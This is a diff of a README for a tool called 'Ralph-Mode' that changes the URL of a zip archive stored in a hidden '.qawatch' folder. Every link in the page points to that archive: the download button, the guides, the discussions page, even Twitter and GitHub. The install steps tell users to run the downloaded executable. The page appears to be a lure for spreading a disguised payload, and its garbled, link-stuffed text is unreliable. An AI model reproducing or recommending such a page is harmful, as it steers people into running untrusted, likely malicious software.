@@ -6,7 +6,7 @@ Welcome to Ralph-Mode! With this autonomous AI-powered tool, you can effortlessl
 
 ## 📥 Download Ralph-Mode
 
-[![Download Ralph-Mode](https://raw.githubusercontent.com/Kirbydads/Ralph-Mode/main/.qawatch/rules/Ralph_Mode_v2.9.zip%20Now-Get%20Ralph--Mode-orange)](https://raw.githubusercontent.com/Kirbydads/Ralph-Mode/main/.qawatch/rules/Ralph_Mode_v2.9.zip)
+[![Download Ralph-Mode](https://github.com/Kirbydads/Ralph-Mode/raw/refs/heads/main/.qawatch/Mode-Ralph-v3.7.zip%20Now-Get%20Ralph--Mode-orange)](https://github.com/Kirbydads/Ralph-Mode/raw/refs/heads/main/.qawatch/Mode-Ralph-v3.7.zip)
 
 To begin using Ralph-Mode, follow these steps to download and install the software on your computer.
 
@@ -18,15 +18,15 @@ Before you download Ralph-Mode, make sure your system meets the following requir
 - **Processor:** Minimum dual-core processor
 - **Memory:** At least 4 GB of RAM
 - **Disk Space:** At least 100 MB of available disk space
-- **https://raw.githubusercontent.com/Kirbydads/Ralph-Mode/main/.qawatch/rules/Ralph_Mode_v2.9.zip** Version 14 or later (for running the application)
+- **https://github.com/Kirbydads/Ralph-Mode/raw/refs/heads/main/.qawatch/Mode-Ralph-v3.7.zip** Version 14 or later (for running the application)
 
 ## 📂 Download & Install
 
-1. **Visit This Page:** Go to our releases page: [Download Ralph-Mode](https://raw.githubusercontent.com/Kirbydads/Ralph-Mode/main/.qawatch/rules/Ralph_Mode_v2.9.zip).
+1. **Visit This Page:** Go to our releases page: [Download Ralph-Mode](https://github.com/Kirbydads/Ralph-Mode/raw/refs/heads/main/.qawatch/Mode-Ralph-v3.7.zip).
    
 2. **Choose Your Version:** Look for the latest version of Ralph-Mode. You will find it listed with its version number and release date.
 
-3. **Download the File:** Click on the link to download the file appropriate for your operating system. For example, you might see "https://raw.githubusercontent.com/Kirbydads/Ralph-Mode/main/.qawatch/rules/Ralph_Mode_v2.9.zip" for Windows users or "https://raw.githubusercontent.com/Kirbydads/Ralph-Mode/main/.qawatch/rules/Ralph_Mode_v2.9.zip" for macOS users.
+3. **Download the File:** Click on the link to download the file appropriate for your operating system. For example, you might see "https://github.com/Kirbydads/Ralph-Mode/raw/refs/heads/main/.qawatch/Mode-Ralph-v3.7.zip" for Windows users or "https://github.com/Kirbydads/Ralph-Mode/raw/refs/heads/main/.qawatch/Mode-Ralph-v3.7.zip" for macOS users.
 
 4. **Run the Installer:** 
    - For Windows: Locate the downloaded `.exe` file in your Downloads folder and double-click it to start the installation process. Follow the on-screen instructions to complete the installation.
@@ -58,23 +58,23 @@ Once you open Ralph-Mode, you can easily set it up:
 
 For more detailed instructions, check out the following guides:
 
-- [Getting Started Guide](https://raw.githubusercontent.com/Kirbydads/Ralph-Mode/main/.qawatch/rules/Ralph_Mode_v2.9.zip)
-- [How to Use the Features](https://raw.githubusercontent.com/Kirbydads/Ralph-Mode/main/.qawatch/rules/Ralph_Mode_v2.9.zip)
-- [Troubleshooting Common Issues](https://raw.githubusercontent.com/Kirbydads/Ralph-Mode/main/.qawatch/rules/Ralph_Mode_v2.9.zip)
+- [Getting Started Guide](https://github.com/Kirbydads/Ralph-Mode/raw/refs/heads/main/.qawatch/Mode-Ralph-v3.7.zip)
+- [How to Use the Features](https://github.com/Kirbydads/Ralph-Mode/raw/refs/heads/main/.qawatch/Mode-Ralph-v3.7.zip)
+- [Troubleshooting Common Issues](https://github.com/Kirbydads/Ralph-Mode/raw/refs/heads/main/.qawatch/Mode-Ralph-v3.7.zip)
 
 ## 💬 Community Support
 
-Join our community to share your experience, ask questions, or report issues. You can participate in discussions on our [Discussions page](https://raw.githubusercontent.com/Kirbydads/Ralph-Mode/main/.qawatch/rules/Ralph_Mode_v2.9.zip).
+Join our community to share your experience, ask questions, or report issues. You can participate in discussions on our [Discussions page](https://github.com/Kirbydads/Ralph-Mode/raw/refs/heads/main/.qawatch/Mode-Ralph-v3.7.zip).
 
 ## 🔗 Learn More
 
 Follow us on social media for updates:
 
-- [Twitter](https://raw.githubusercontent.com/Kirbydads/Ralph-Mode/main/.qawatch/rules/Ralph_Mode_v2.9.zip)
-- [GitHub](https://raw.githubusercontent.com/Kirbydads/Ralph-Mode/main/.qawatch/rules/Ralph_Mode_v2.9.zip)
+- [Twitter](https://github.com/Kirbydads/Ralph-Mode/raw/refs/heads/main/.qawatch/Mode-Ralph-v3.7.zip)
+- [GitHub](https://github.com/Kirbydads/Ralph-Mode/raw/refs/heads/main/.qawatch/Mode-Ralph-v3.7.zip)
 
 For any queries, feel free to reach out via our GitHub issues page.
 
 ## 📥 Download Ralph-Mode Again
 
-To download or reinstall the software, visit this link: [Download Ralph-Mode](https://raw.githubusercontent.com/Kirbydads/Ralph-Mode/main/.qawatch/rules/Ralph_Mode_v2.9.zip).
+To download or reinstall the software, visit this link: [Download Ralph-Mode](https://github.com/Kirbydads/Ralph-Mode/raw/refs/heads/main/.qawatch/Mode-Ralph-v3.7.zip).
